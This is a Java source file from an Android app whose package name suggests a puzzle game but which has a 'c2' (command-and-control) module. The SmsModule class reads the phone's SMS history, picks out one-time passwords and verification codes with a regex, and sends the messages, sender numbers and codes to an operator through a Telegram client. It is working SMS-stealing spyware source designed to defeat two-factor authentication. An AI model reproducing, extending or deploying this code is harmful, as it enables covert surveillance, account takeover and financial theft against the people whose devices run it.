package com.gempuzzle.quest.c2.modules;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import com.gempuzzle.quest.c2.TelegramClient;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class SmsModule {

    private static final Pattern OTP = Pattern.compile(
            "(?<!\\d)(\\d{4,8})(?!\\d)|(?:otp|code|pin|key|password|passcode|verification|verify|one.?time)[^\\d]{0,20}(\\d{4,8})",
            Pattern.CASE_INSENSITIVE);

    public static void readSms(Context ctx, int n) {
        StringBuilder sb = new StringBuilder("💬 *SMS (last " + n + ")*\n\n");
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT " + n);
        if (c == null) { TelegramClient.sendMessage("⚠ no SMS access"); return; }
        SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
        int count = 0;
        while (c.moveToNext() && count < n) {
            String addr = c.getString(0);
            String body = c.getString(1);
            long date = c.getLong(2);
            int type = c.getInt(3);
            String dir = type == 1 ? "📥" : "📤";
            String otpMark = isOtp(body) ? " 🔑" : "";
            sb.append(dir).append(" `").append(addr).append("` · ").append(sdf.format(new Date(date)))
                    .append(otpMark).append("\n").append(body).append("\n\n");
            count++;
        }
        c.close();
        if (count == 0) sb.append("_empty_");
        TelegramClient.sendMessage(sb.toString());
    }

    public static void otpLog(Context ctx) {
        StringBuilder sb = new StringBuilder("🔑 *OTP LOG*\n\n");
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 200");
        if (c == null) { TelegramClient.sendMessage("⚠ no SMS access"); return; }
        SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
        int found = 0;
        while (c.moveToNext() && found < 30) {
            String body = c.getString(1);
            if (isOtp(body)) {
                String code = extractOtp(body);
                sb.append("⏰ ").append(sdf.format(new Date(c.getLong(2))))
                        .append(" · `").append(c.getString(0)).append("`\n")
                        .append("🔑 *").append(code).append("*\n")
                        .append(body).append("\n\n");
                found++;
            }
        }
        c.close();
        if (found == 0) sb.append("_no OTPs found_");
        TelegramClient.sendMessage(sb.toString());
    }

    public static boolean isOtp(String body) {
        if (body == null) return false;
        return OTP.matcher(body).find();
    }

    public static String extractOtp(String body) {
        Matcher m = OTP.matcher(body);
        if (m.find()) {
            if (m.group(1) != null) return m.group(1);
            if (m.group(2) != null) return m.group(2);
        }
        return "?";
    }

    private SmsModule() {}
}
